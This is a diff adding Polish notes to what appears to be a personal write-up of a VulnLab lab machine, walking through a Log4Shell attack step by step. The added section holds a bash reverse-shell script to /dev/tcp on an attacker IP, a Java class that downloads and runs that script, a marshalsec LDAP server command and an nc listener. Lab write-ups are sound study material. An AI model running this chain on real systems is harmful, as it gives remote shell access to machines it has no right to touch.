@@ -51,5 +51,67 @@ trzeba znaleźć staszą javę
 
 `library initialization failed - unable to allocate file descriptor table - out of memory`??????????
 
+![{419698F3-6A22-43DD-A477-79C466314260}](https://github.com/user-attachments/assets/a38b0407-488f-4308-b577-36ab7af4ed8e)
 
+powoli do przodu...
 
+![{D495A742-ADF3-4C65-897C-3CDE7F75B3FB}](https://github.com/user-attachments/assets/25ff772f-fa79-48e6-ae2e-c655f9e0055f)
+
+Dobra co ja tutaj przeszełem to nie mam pytań. Ostatni hard kosztował mnie mniej wysiłku.
+
+![{204D1839-B065-4B0D-AF8E-80C640D6C2B2}](https://github.com/user-attachments/assets/70e2a69d-4657-47f0-acb3-85be91a7d1f6)
+
+### INSTRUKCJA
+
+najpierw pliczek `a`
+```
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.8.4.124/443 0>&1'
+```
+
+teraz pliczek Exploit.java
+```
+public class Exploit {
+    static {
+        try {
+            Runtime r = Runtime.getRuntime();
+            Process p = r.exec("wget http://10.8.4.124/a -O /tmp/a");
+            p.waitFor();
+            r = Runtime.getRuntime();
+            p = r.exec("/bin/bash /tmp/a");
+            p.waitFor();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+    public Exploit(){
+        System.out.println("Pleeeeeease");
+    }
+}
+```
+
+teraz musimy mieć `jdk1.8.0_20/bin/javac` z oficjalnej strony javy.
+
+kompilujmy
+```
+/home/kali/SHARED/vulnlab/Feedback/log4j-shell-poc/jdk1.8.0_20/bin/javac Exploit.java -source 8 -target 8
+```
+
+dwa serwery pythona sobie stawiamy
+```
+python3 -m http.server 8000
+python3 -m http.server 80
+```
+
+odpalamy
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.8.4.124:8000/#Exploit"
+```
+
+ustawiamy listener
+```
+nc -lvnp 443
+```
+i na końcu wchodzimy na stronę
+
+![{7E159FF4-D89C-4BF6-B124-C4C2B51EEE5D}](https://github.com/user-attachments/assets/ffac08b7-1f16-459a-a28b-d16add28c0fa)
